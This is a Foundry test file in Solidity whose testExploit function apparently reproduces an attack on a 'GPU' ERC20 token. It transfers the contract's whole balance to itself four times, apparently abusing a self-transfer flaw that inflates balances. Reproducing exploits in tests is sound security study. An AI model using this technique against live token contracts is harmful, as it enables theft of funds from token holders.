// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {GPUBaseTest} from "./GPUBase.t.sol";

contract GPUTest is GPUBaseTest {
    function testExploit() external validation {
      for(uint i = 0; i < 4; i++) {
        uint256 balance = token.balanceOf(address(this));
        token.transfer(address(this), balance);
      }
    }
}
